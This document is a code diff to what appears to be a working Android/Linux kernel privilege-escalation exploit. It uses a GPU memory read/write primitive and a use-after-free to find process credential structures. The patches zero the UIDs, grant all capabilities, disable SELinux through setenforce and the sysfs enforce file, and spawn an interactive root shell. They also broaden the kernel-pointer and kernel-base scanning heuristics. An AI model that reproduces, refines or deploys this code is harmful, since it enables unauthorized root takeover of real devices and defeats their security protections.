@@ -1183,7 +1183,7 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
     
     // Scan for our UID in the structure to be absolutely sure where to patch
     for (int i = 0; i < 128; i += 4) {
-        if (*(uint32_t *)(cred_page + i) == my_uid && *(uint32_t *)(cred_page + i + 4) == my_uid) {
+        if (*(uint32_t *)(cred_page + i) == my_uid) {
             uid_off = i;
             break;
         }
@@ -1199,9 +1199,6 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
     uint8_t zero_creds[32] = {0};
     gpu_write_task_virt(fd, cred_ptr + uid_off, zero_creds, 32);
     
-    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
-        gpu_write_task_virt(fd, real_cred_ptr + uid_off, zero_creds, 32);
-
     // Patch capabilities (usually fixed distance from UIDs)
     uint8_t all_caps[32];
     memset(all_caps, 0xff, 32);
@@ -1318,12 +1315,20 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
     }
 
     // 3. Patch specific process credentials (most reliable)
-    uint64_t real_cred_ptr = *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR];
     if (cred_ptr != 0) {
-        fprintf(stderr, "[PARENT] Patching target process CRED at 0x%lx (Real: 0x%lx)...\n", 
-                (unsigned long)cred_ptr, (unsigned long)real_cred_ptr);
+        fprintf(stderr, "[PARENT] Patching target process CRED pointers at task+0x848, 0x850, 0x870, 0x878...\n");
         
-        patch_cred_via_gpu(fd, cred_ptr, real_cred_ptr);
+        // Read the actual pointers from task_struct to be sure
+        uint64_t c1, c2, c3, c4;
+        gpu_read_task_struct(fd, task_va + 0x848, (uint8_t *)&c1, 8);
+        gpu_read_task_struct(fd, task_va + 0x850, (uint8_t *)&c2, 8);
+        gpu_read_task_struct(fd, task_va + 0x870, (uint8_t *)&c3, 8);
+        gpu_read_task_struct(fd, task_va + 0x878, (uint8_t *)&c4, 8);
+        
+        if ((c1 >> 48) == 0xffff) patch_cred_via_gpu(fd, c1, 0);
+        if ((c2 >> 48) == 0xffff) patch_cred_via_gpu(fd, c2, 0);
+        if ((c3 >> 48) == 0xffff) patch_cred_via_gpu(fd, c3, 0);
+        if ((c4 >> 48) == 0xffff) patch_cred_via_gpu(fd, c4, 0);
     }
 
     // 4. Mass Patch all CREDs matching our UID in UAF range (extra safety)
@@ -1415,7 +1420,13 @@ shell:
     system("getenforce");
     fprintf(stderr, "[CHILD %d] Attempting to disable SELinux (setenforce 0)...\n", getpid());
     system("setenforce 0 2>/dev/null");
+    // Also try to write directly to the sysfs if available
+    system("echo 0 > /sys/fs/selinux/enforce 2>/dev/null");
     system("getenforce");
+
+    // Try to escalate privileges via syscalls again just in case
+    setresuid(0, 0, 0);
+    setresgid(0, 0, 0);
 
     // Use execl for a cleaner shell transition
     execl("/system/bin/sh", "sh", "-i", NULL);
@@ -1517,12 +1528,11 @@ static uint64_t find_kernel_base_from_task_va(uint64_t task_va)
     for (int off = 0; off < 4096 - 8; off += 8) {
         uint64_t ptr = *(uint64_t *)(task_data + off);
         
-        // Kernel text/data range for AArch64 (0xffffff80... to 0xffffff9f...)
-        if (((ptr >> 40) >= 0xffff80 && (ptr >> 40) <= 0xffff9f) || 
-            ((ptr >> 40) >= 0xffff8e && (ptr >> 40) <= 0xffff8f)) { 
+        // Broad range for AArch64 kernel pointers (0xffffff00... to 0xffffffff...)
+        if ((ptr >> 48) == 0xffff) { 
             // Scan backwards from ptr in 2MB steps for ELF magic
             uint64_t start = ptr & ~0x1fffffULL;
-            for (int i = 0; i < 512; i++) { // Search up to 1GB backwards
+            for (int i = 0; i < 1024; i++) { // Search up to 2GB backwards
                 uint64_t test_va = start - (i * 0x200000ULL);
                 uint32_t magic = 0;
                 if (gpu_read_task_struct(fd, test_va, (uint8_t *)&magic, 4) == 0) {
@@ -1549,8 +1559,8 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
 
     for (int off = scan_start; off < scan_end; off += 8) {
         uint64_t ptr = *(uint64_t *)(task_data + off);
-        // Kernel pointers range (0xffffff80... to 0xffffff9f...)
-        if ((ptr >> 40) >= 0xffff80 && (ptr >> 40) <= 0xffff9f) { 
+        // Broad range for kernel pointers
+        if ((ptr >> 48) == 0xffff) { 
             uint8_t cred_page[256];
             if (gpu_read_task_struct(fd, ptr, cred_page, 256) == 0) {
                 // Scan for our UID in the pointed-to memory
